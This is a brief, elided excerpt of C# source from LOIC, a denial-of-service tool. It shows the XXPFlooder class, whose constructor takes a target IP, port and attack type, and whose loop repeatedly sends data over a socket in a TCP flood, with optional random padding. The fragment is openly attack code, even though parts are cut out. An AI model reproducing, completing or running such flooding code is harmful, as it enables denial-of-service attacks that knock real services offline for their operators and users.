...
namespace LOIC
{
	public class XXPFlooder
	{
		...
		public XXPFlooder(string ip, int port, AttackTypes attacktype, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
				...
				while (IsFlooding)
				{
					...
					if (AttackType == AttackTypes.TcpFlood)
					{
						...
						try
						{
							...
							{
								FloodCount++;
								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Utils.RandomString() : null) ));
								socket.Send(buf);
